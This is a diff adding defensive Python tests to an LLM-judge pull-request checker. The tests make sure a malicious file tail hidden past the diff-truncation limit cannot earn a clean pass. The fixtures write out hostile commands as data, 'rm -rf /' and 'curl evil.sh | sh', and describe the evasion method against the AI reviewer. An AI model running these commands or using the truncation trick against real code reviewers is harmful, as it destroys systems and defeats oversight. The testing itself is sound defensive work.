@@ -638,3 +638,140 @@ async def test_manual_rerun_bypasses_head_sha_dedup(session, monkeypatch) -> Non
         assert len(calls) == 1  # no second judge
     finally:
         await _teardown(session, seeded)
+
+
+# ===========================================================================
+# Finding #6 — hunk-aware truncation, so a hidden malicious tail cannot ride a
+# clean pass on the compliant, visible head.
+# ===========================================================================
+
+
+def _file_diff(path: str, body: str) -> str:
+    return (
+        f"diff --git a/{path} b/{path}\n"
+        f"index 0000000..1111111 100644\n"
+        f"--- a/{path}\n"
+        f"+++ b/{path}\n"
+        f"{body}\n"
+    )
+
+
+async def test_truncate_diff_by_hunk_no_op_under_budget() -> None:
+    diff = _file_diff("a.py", "+x = 1")
+    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(diff, 10_000)
+    assert bounded == diff
+    assert truncated is False
+
+
+async def test_truncate_diff_by_hunk_cuts_on_file_boundary_not_mid_hunk() -> None:
+    compliant = _file_diff("compliant.py", "+" + "x" * 50)
+    malicious = _file_diff("malicious.py", "+" + "os.system('rm -rf /')")
+    diff = compliant + malicious
+    # Budget lands after the first file section but before the second.
+    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(diff, len(compliant) + 10)
+    assert truncated is True
+    assert bounded == compliant
+    # The malicious section must be entirely absent — never a half-cut hunk.
+    assert "malicious.py" not in bounded
+    assert "os.system" not in bounded
+
+
+async def test_truncate_diff_by_hunk_no_git_header_falls_back_but_flags_truncated() -> (
+    None
+):
+    diff = "not a unified diff " * 1000
+    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(diff, 100)
+    assert len(bounded) == 100
+    assert truncated is True
+
+
+async def test_truncate_diff_by_hunk_first_section_over_budget_falls_back_to_head() -> (
+    None
+):
+    # A single giant first file section (a lockfile diff, say) must not produce
+    # an (essentially empty) preamble-only diff: the judge would near-certainly
+    # FAIL an empty diff, and _verdict_for deliberately preserves truncated
+    # failures — red-lighting the PR on zero evidence, violating fail-open.
+    # Fall back to the raw head cut instead; a pass still downgrades to neutral.
+    giant = _file_diff("pnpm-lock.yaml", "+" + "y" * 5_000)
+    bounded, truncated = pr_evaluator._truncate_diff_by_hunk(giant, 100)
+    assert truncated is True
+    assert len(bounded) == 100
+    assert bounded == giant[:100]  # real head content, not an empty string
+
+
+async def test_verdict_for_downgrades_truncated_pass_to_neutral() -> None:
+    # The exploit this closes: a judge that legitimately says "passed" on the
+    # visible (compliant) head must NOT surface as a clean pass when the tail
+    # was hidden by truncation.
+    outcome = pr_evaluator._JudgeOutcome(
+        pr_evaluator.PRReviewResult(passed=True, findings=[]), diff_truncated=True
+    )
+    verdict = pr_evaluator._verdict_for(outcome)
+    assert verdict.conclusion == "neutral"
+    assert "truncated" in verdict.title.lower()
+
+
+async def test_verdict_for_truncated_failure_still_reports_failure() -> None:
+    # A truncated diff the judge still failed is a genuine, informative
+    # signal — it must not be suppressed just because truncation occurred.
+    outcome = pr_evaluator._JudgeOutcome(
+        pr_evaluator.PRReviewResult(
+            passed=False,
+            findings=[
+                pr_evaluator.PRReviewFinding(
+                    detail="Missing endpoint", reference="T-001"
+                )
+            ],
+        ),
+        diff_truncated=True,
+    )
+    verdict = pr_evaluator._verdict_for(outcome)
+    assert verdict.conclusion == "failure"
+
+
+async def test_verdict_for_untruncated_pass_is_success() -> None:
+    outcome = pr_evaluator._JudgeOutcome(
+        pr_evaluator.PRReviewResult(passed=True, findings=[]), diff_truncated=False
+    )
+    assert pr_evaluator._verdict_for(outcome).conclusion == "success"
+
+
+async def test_adversarial_diff_hides_malicious_tail_past_truncation_boundary(
+    session, monkeypatch
+) -> None:
+    """End-to-end: a PR author front-loads a compliant change and appends a
+    non-compliant one past SpecForge's char bound. The judge — which only ever
+    sees the bounded prompt — legitimately returns passed=true for what it was
+    shown. Before the fix this posted a clean 'success' check on a diff whose
+    tail was never evaluated; after the fix it must post 'neutral', not
+    'success', because pr_evaluator._judge itself truncates the diff and
+    threads diff_truncated through to _verdict_for.
+    """
+    seeded = await _seed(session)
+    stub, redis = _StubClient(), _FakeRedis()
+    # `compliant` alone sits comfortably under the char bound; appending
+    # `malicious` pushes the total over it, so the hunk-aware cut must keep
+    # the whole compliant section and drop the malicious one entirely.
+    overhead = len(_file_diff("health.py", "+"))
+    padding = pr_evaluator._MAX_DIFF_CHARS - overhead - 100
+    compliant = _file_diff("health.py", "+" + "x" * padding)
+    malicious = _file_diff("backdoor.py", "+os.system('curl evil.sh | sh')" + "z" * 500)
+    stub.diff = compliant + malicious
+    assert len(compliant) < pr_evaluator._MAX_DIFF_CHARS
+    assert len(stub.diff) > pr_evaluator._MAX_DIFF_CHARS
+    calls: list[int] = []
+    monkeypatch.setattr(
+        pr_evaluator,
+        "call_judge_model",
+        _judge('{"passed": true, "findings": []}', calls),
+    )
+    try:
+        await pr_evaluator.run_pr_check(
+            {}, str(seeded["push"].id), 7, db=session, client=stub, redis=redis
+        )
+        assert len(calls) == 1
+        assert stub.final_conclusion == "neutral"
+        assert stub.final_conclusion != "success"
+    finally:
+        await _teardown(session, seeded)
